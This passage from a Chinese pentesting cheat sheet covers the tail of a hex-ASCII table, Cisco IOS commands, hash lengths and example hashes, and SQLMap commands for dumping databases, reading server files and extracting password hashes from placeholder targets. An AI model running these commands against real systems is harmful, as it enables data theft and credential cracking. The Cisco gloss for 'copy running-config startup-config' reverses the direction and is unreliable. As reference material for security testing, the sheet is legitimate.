| `x60` | \` |
| `x61` | a |
| `x62` | b |
| `x63` | c |
| `x64` | d |
| `x65` | e |
| `x66` | f |
| `x67` | g |
| `x68` | h |
| `x69` | i |
| `x6a` | j |
| `x6b` | k |
| `x6c` | l |
| `x6d` | m |
| `x6e` | n |
| `x6f` | o |
| `x70` | p |
| `x71` | q |
| `x72` | r |
| `x73` | s |
| `x74` | t |
| `x75` | u |
| `x76` | v |
| `x77` | w |
| `x78` | x |
| `x79` | y |
| `x7a` | z |

## CISCO IOS\(网际操作系统\) 命令

收集一些有用的Cisco IOS 命令.

| 命令 | 解释 |
| :--- | :--- |
| `enable` | 进入使能模式 |
| `conf t` | 配置终端 |
| `(config)# interface fa0/0` | 配置 FastEthernet 0/0 |
| `(config-if)# ip addr 0.0.0.0 255.255.255.255` | 添加IP到 fa0/0 |
| `(config-if)# line vty 0 4` | 配置 vty line |
| `(config-line)# login` | 登陆 |
| `(config-line)# password YOUR-PASSWORD` | 设置 telnet 密码 |
| `# show running-config` | 显示内存中的运行配置 |
| `# show startup-config` | 显示启动配置 |
| `# show version` | 显示cisco IOS 版本 |
| `# show session` | 显示已打开的会话 |
| `# show ip interface` | 显示网卡 |
| `# show interface e0` | 显示网络接口细节 |
| `# show ip route` | 显示路由 |
| `# show access-lists` | 显示access lists |
| `# dir file systems` | 列出可用文件 |
| `# dir all-filesystems` | 显示文件信息 |
| `# dir /all` | 显示已删除文件 |
| `# terminal length 0` | 取消终端输出长度限制 |
| `# copy running-config tftp` | 复制运行配置到tftp 服务器 |
| `# copy running-config startup-config` | 复制启动配置到运行配置 |

## 密码学

### 哈希长度

| 哈希 | 长度 |
| :--- | :--- |
| MD5 | `16 Bytes` |
| SHA-1 | `20 Bytes` |
| SHA-256 | `32 Bytes` |
| SHA-512 | `64 Bytes` |

### 哈希例子

可以直接使用 **hash-identifier** 命令判断哈希类型，但这里还是举些例子。

| 哈希 | 例子 |
| :--- | :--- |
| MD5 Hash Example | `8743b52063cd84097a65d1633f5c74f5` |
| MD5 $PASS:$SALT Example | `01dfae6e5d4d90d9892622325959afbe:7050461` |
| MD5 $SALT:$PASS | `f0fda58630310a6dd91a7d8f0a4ceda2:4225637426` |
| SHA1 Hash Example | `b89eaac7e61417341b710b727768294d0e6a277b` |
| SHA1 $PASS:$SALT | `2fc5a684737ce1bf7b3b239df432416e0dd07357:2014` |
| SHA1 $SALT:$PASS | `cac35ec206d868b7d7cb0b55f31d9425b075082b:5363620024` |
| SHA-256 | `127e6fbfe24a750e72930c220a8e138275656b8e5d8f48a98c3c92df2caba935` |
| SHA-256 $PASS:$SALT | `c73d08de890479518ed60cf670d17faa26a4a71f995c1dcc978165399401a6c4` |
| SHA-256 $SALT:$PASS | `eb368a2dfd38b405f014118c7d9747fcc97f4f0ee75c05963cd9da6ee65ef498:560407001617` |
| SHA-512 | `82a9dda829eb7f8ffe9fbe49e45d47d2dad9664fbb7adf72492e3c81ebd3e29134d9bc12212bf83c6840f10e8246b9db54a4859b7ccd0123d86e5872c1e5082f` |
| SHA-512 $PASS:$SALT | `e5c3ede3e49fb86592fb03f471c35ba13e8d89b8ab65142c9a8fdafb635fa2223c24e5558fd9313e8995019dcbec1fb584146b7bb12685c7765fc8c0d51379fd` |
| SHA-512 $SALT:$PASS | `976b451818634a1e2acba682da3fd6efa72adf8a7a08d7939550c244b237c72c7d42367544e826c0c83fe5c02f97c0373b6b1386cc794bf0d21d2df01bb9c08a` |
| NTLM Hash Example | `b4b9b02e6f09a9bd760f388b67351e2b` |

## SQLMap例子

小型 SQLMap 速查表：

| 命令 | 解释 |
| :--- | :--- |
| `sqlmap -u http://meh.com --forms --batch --crawl=10  --cookie=jsessionid=54321 --level=5 --risk=3` | 自动化sqlmap扫描 |
| `sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE  --level=3 --current-user --current-db --passwords  --file-read="/var/www/blah.php"` | 指定目标的sqlmap scan |
| `sqlmap -u "http://meh.com/meh.php?id=1" --dbms=mysql --tech=U --random-agent --dump` | 使用联合查询技术扫描mysql后端的基于报错的注入 ，使用随机UA，导出数据库 |
| `sqlmap -o -u "http://meh.com/form/" --forms` | 检测可能存在注入点表单 |
| `sqlmap -o -u "http://meh/vuln-form" --forms  -D database-name -T users --dump` | 导出指定数据库的user表并尝试破解哈希。 |

